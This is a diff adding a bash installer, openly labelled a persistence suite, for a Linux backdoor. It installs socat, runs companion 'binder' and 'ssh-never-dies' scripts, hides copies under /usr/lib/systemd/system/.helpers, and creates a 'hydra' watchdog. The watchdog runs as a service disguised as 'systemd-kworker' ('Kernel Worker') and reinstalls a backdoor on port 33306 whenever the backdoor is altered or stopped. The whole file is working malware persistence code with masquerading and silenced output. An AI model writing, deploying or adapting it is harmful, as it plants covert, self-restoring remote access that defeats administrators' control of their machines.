@@ -1,0 +1,308 @@
+#!/usr/bin/env bash
+# Watchdog Installer - Sets up ALL persistence mechanisms
+# axon | AU
+set -euo pipefail
+
+need_root() {
+  if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
+    echo "Run as root." >&2
+    exit 1
+  fi
+}
+
+need_root
+
+echo "[*] Installing complete persistence suite..."
+echo ""
+
+# Install socat if not present (needed for reliable backdoor)
+if ! command -v socat >/dev/null 2>&1; then
+    echo "[*] Installing socat (required for backdoor)..."
+    
+    # Detect package manager and install socat
+    if command -v apt-get >/dev/null 2>&1; then
+        apt-get update -qq && apt-get install -y socat >/dev/null 2>&1 && echo "[+] Installed socat via apt"
+    elif command -v dnf >/dev/null 2>&1; then
+        dnf install -y socat >/dev/null 2>&1 && echo "[+] Installed socat via dnf"
+    elif command -v yum >/dev/null 2>&1; then
+        yum install -y socat >/dev/null 2>&1 && echo "[+] Installed socat via yum"
+    elif command -v pacman >/dev/null 2>&1; then
+        pacman -Sy --noconfirm socat >/dev/null 2>&1 && echo "[+] Installed socat via pacman"
+    elif command -v zypper >/dev/null 2>&1; then
+        zypper install -y socat >/dev/null 2>&1 && echo "[+] Installed socat via zypper"
+    elif command -v apk >/dev/null 2>&1; then
+        apk add --no-cache socat >/dev/null 2>&1 && echo "[+] Installed socat via apk"
+    else
+        echo "[!] Warning: Could not install socat (unknown package manager)"
+        echo "[!] Backdoor may use less reliable netcat fallback"
+    fi
+    echo ""
+else
+    echo "[+] socat already installed"
+    echo ""
+fi
+
+# Determine script directory
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+
+# Check if binder exists
+BINDER_PATH=""
+if [ -f "${SCRIPT_DIR}/binder" ]; then
+    BINDER_PATH="${SCRIPT_DIR}/binder"
+elif [ -f "/mnt/user-data/uploads/binder" ]; then
+    BINDER_PATH="/mnt/user-data/uploads/binder"
+elif [ -f "./binder" ]; then
+    BINDER_PATH="./binder"
+fi
+
+# Check if ssh-never-dies exists
+SSH_PATH=""
+if [ -f "${SCRIPT_DIR}/ssh-never-dies" ]; then
+    SSH_PATH="${SCRIPT_DIR}/ssh-never-dies"
+elif [ -f "/mnt/user-data/uploads/ssh-never-dies" ]; then
+    SSH_PATH="/mnt/user-data/uploads/ssh-never-dies"
+elif [ -f "./ssh-never-dies" ]; then
+    SSH_PATH="./ssh-never-dies"
+fi
+
+# Install binder (systemd-netplan backdoor)
+if [ -n "$BINDER_PATH" ]; then
+    echo "[1/3] Installing systemd-netplan (binder)..."
+    bash "$BINDER_PATH"
+    echo "[+] systemd-netplan installed"
+    echo ""
+else
+    echo "[!] Warning: binder script not found, skipping"
+    echo ""
+fi
+
+# Install ssh-never-dies (systemd-map SSH protection)
+if [ -n "$SSH_PATH" ]; then
+    echo "[2/3] Installing systemd-map (SSH protection)..."
+    # Redirect the journalctl output to background so it doesn't hang
+    timeout 3 bash "$SSH_PATH" 2>&1 | grep -v "^Hint:" || true
+    echo "[+] systemd-map installed"
+    echo ""
+else
+    echo "[!] Warning: ssh-never-dies script not found, skipping"
+    echo ""
+fi
+
+# Now install the watchdog itself
+echo "[3/3] Installing systemd-kworker (hydra watchdog)..."
+
+# Create directories - using systemd's own infrastructure
+install -d /usr/lib/systemd/system/.helpers
+install -d /usr/lib/systemd/system
+install -d /lib/systemd/system
+
+# Copy original installer scripts to hidden location for respawning
+if [ -n "$BINDER_PATH" ]; then
+    cp "$BINDER_PATH" /usr/lib/systemd/system/.helpers/netplan-init
+    chmod 755 /usr/lib/systemd/system/.helpers/netplan-init
+fi
+
+if [ -n "$SSH_PATH" ]; then
+    cp "$SSH_PATH" /usr/lib/systemd/system/.helpers/map-init
+    chmod 755 /usr/lib/systemd/system/.helpers/map-init
+fi
+
+# Create the watchdog script (named hydra) - MORE RESILIENT VERSION
+cat > /usr/lib/systemd/system/.helpers/hydra <<'WATCHDOG_SCRIPT'
+#!/usr/bin/env bash
+# Persistence Watchdog - Monitors and respawns both mechanisms
+set -eo pipefail
+
+# Configuration
+CHECK_INTERVAL="${CHECK_INTERVAL:-10}"
+SCRIPT_DIR="/usr/lib/systemd/system/.helpers"
+
+# File checksums storage
+CHECKSUM_DIR="/var/opt/.state"
+mkdir -p "$CHECKSUM_DIR" 2>/dev/null || true
+chmod 700 "$CHECKSUM_DIR" 2>/dev/null || true
+
+have() { 
+    command -v "$1" >/dev/null 2>&1
+}
+
+calc_checksum() {
+    local file="$1"
+    if [ ! -e "$file" ]; then
+        echo "MISSING"
+        return 0
+    fi
+    
+    if have sha256sum; then
+        sha256sum "$file" 2>/dev/null | awk '{print $1}' || echo "ERROR"
+    elif have shasum; then
+        shasum -a 256 "$file" 2>/dev/null | awk '{print $1}' || echo "ERROR"
+    else
+        md5sum "$file" 2>/dev/null | awk '{print $1}' || echo "ERROR"
+    fi
+}
+
+store_checksum() {
+    local file="$1"
+    local checksum_file="${CHECKSUM_DIR}/$(echo "$file" | tr '/' '_')"
+    calc_checksum "$file" > "$checksum_file" 2>/dev/null || true
+}
+
+file_changed() {
+    local file="$1"
+    local checksum_file="${CHECKSUM_DIR}/$(echo "$file" | tr '/' '_')"
+    
+    if [ ! -e "$checksum_file" ]; then
+        return 1
+    fi
+    
+    local old_sum=$(cat "$checksum_file" 2>/dev/null || echo "")
+    local new_sum=$(calc_checksum "$file")
+    
+    [ "$old_sum" != "$new_sum" ]
+}
+
+reinstall_binder() {
+    if [ -x "${SCRIPT_DIR}/netplan-init" ]; then
+        bash "${SCRIPT_DIR}/netplan-init" >/dev/null 2>&1 || true
+    fi
+}
+
+reinstall_mapper() {
+    if [ -x "${SCRIPT_DIR}/map-init" ]; then
+        timeout 5 bash "${SCRIPT_DIR}/map-init" >/dev/null 2>&1 || true
+    fi
+}
+
+check_binder() {
+    local needs_reinstall=0
+    
+    file_changed "/usr/local/bin/systemd-netplan" && needs_reinstall=1
+    file_changed "/usr/lib/systemd/system/systemd-netplan.service" && needs_reinstall=1
+    
+    [ ! -f "/usr/lib/systemd/system/systemd-netplan.service" ] && [ ! -f "/lib/systemd/system/systemd-netplan.service" ] && needs_reinstall=1
+    [ ! -f "/etc/systemd/network/.systemd-netplan/systemd-netplan.service" ] && needs_reinstall=1
+    
+    systemctl is-enabled systemd-netplan.service >/dev/null 2>&1 || needs_reinstall=1
+    systemctl is-active systemd-netplan.service >/dev/null 2>&1 || needs_reinstall=1
+    
+    if [ $needs_reinstall -eq 1 ]; then
+        reinstall_binder
+        store_checksum "/usr/local/bin/systemd-netplan"
+        store_checksum "/usr/lib/systemd/system/systemd-netplan.service"
+    fi
+}
+
+check_mapper() {
+    local needs_reinstall=0
+    
+    file_changed "/usr/local/sbin/systemd-map" && needs_reinstall=1
+    file_changed "/usr/local/sbin/systemd-map-seed" && needs_reinstall=1
+    file_changed "/usr/lib/systemd/system/systemd-map.service" && needs_reinstall=1
+    
+    [ ! -f "/usr/lib/systemd/system/systemd-map.service" ] && [ ! -f "/lib/systemd/system/systemd-map.service" ] && needs_reinstall=1
+    [ ! -d "/var/opt/maps/.safe" ] && needs_reinstall=1
+    
+    systemctl is-enabled systemd-map.service >/dev/null 2>&1 || needs_reinstall=1
+    systemctl is-active systemd-map.service >/dev/null 2>&1 || needs_reinstall=1
+    
+    if [ $needs_reinstall -eq 1 ]; then
+        reinstall_mapper
+        store_checksum "/usr/local/sbin/systemd-map"
+        store_checksum "/usr/local/sbin/systemd-map-seed"
+        store_checksum "/usr/lib/systemd/system/systemd-map.service"
+    fi
+}
+
+initialize_checksums() {
+    store_checksum "/usr/local/bin/systemd-netplan"
+    store_checksum "/usr/lib/systemd/system/systemd-netplan.service"
+    
+    store_checksum "/usr/local/sbin/systemd-map"
+    store_checksum "/usr/local/sbin/systemd-map-seed"
+    store_checksum "/usr/lib/systemd/system/systemd-map.service"
+}
+
+main() {
+    # Initialize checksums if needed
+    if [ ! -d "$CHECKSUM_DIR" ] || [ -z "$(ls -A "$CHECKSUM_DIR" 2>/dev/null)" ]; then
+        initialize_checksums
+    fi
+    
+    # Main monitoring loop
+    while true; do
+        check_binder || true
+        check_mapper || true
+        sleep "$CHECK_INTERVAL"
+    done
+}
+
+# Run main loop
+main
+WATCHDOG_SCRIPT
+
+chmod 755 /usr/lib/systemd/system/.helpers/hydra
+
+# Create systemd service (systemd-kworker)
+cat > /usr/lib/systemd/system/systemd-kworker.service <<'SERVICE_EOF'
+[Unit]
+Description=Kernel Worker
+Documentation=man:kworker(7)
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/lib/systemd/system/.helpers/hydra
+Restart=always
+RestartSec=5
+User=root
+Group=root
+
+Environment="CHECK_INTERVAL=10"
+
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+SERVICE_EOF
+
+chmod 644 /usr/lib/systemd/system/systemd-kworker.service
+
+# Only copy to /lib if it's a different directory (not a symlink to the same location)
+if [ ! -f "/lib/systemd/system/systemd-kworker.service" ] || ! cmp -s /usr/lib/systemd/system/systemd-kworker.service /lib/systemd/system/systemd-kworker.service 2>/dev/null; then
+    cp /usr/lib/systemd/system/systemd-kworker.service /lib/systemd/system/systemd-kworker.service 2>/dev/null || true
+    chmod 644 /lib/systemd/system/systemd-kworker.service 2>/dev/null || true
+fi
+
+# Set ownership
+chown -R root:root /usr/lib/systemd/system/.helpers
+chmod -R go-rwx /usr/lib/systemd/system/.helpers
+chown root:root /usr/lib/systemd/system/systemd-kworker.service
+chown root:root /lib/systemd/system/systemd-kworker.service 2>/dev/null || true
+
+# Enable and start the watchdog
+systemctl daemon-reload
+systemctl enable systemd-kworker.service
+systemctl start systemd-kworker.service
+
+echo "[+] systemd-kworker (hydra) installed"
+echo ""
+echo "=========================================="
+echo "    INSTALLATION COMPLETE"
+echo "=========================================="
+echo ""
+echo "Installed services:"
+echo "  • systemd-netplan    - Backdoor on port 33306"
+echo "  • systemd-map        - SSH protection/restoration"
+echo "  • systemd-kworker    - Watchdog (monitors and respawns)"
+echo ""
+echo "Hidden scripts: /usr/lib/systemd/system/.helpers/"
+echo ""
+echo "Status commands:"
+echo "  systemctl status systemd-netplan"
+echo "  systemctl status systemd-map"
+echo "  systemctl status systemd-kworker"
+echo ""
+echo "Port check:"
+echo "  ss -tulnp | grep 33306"
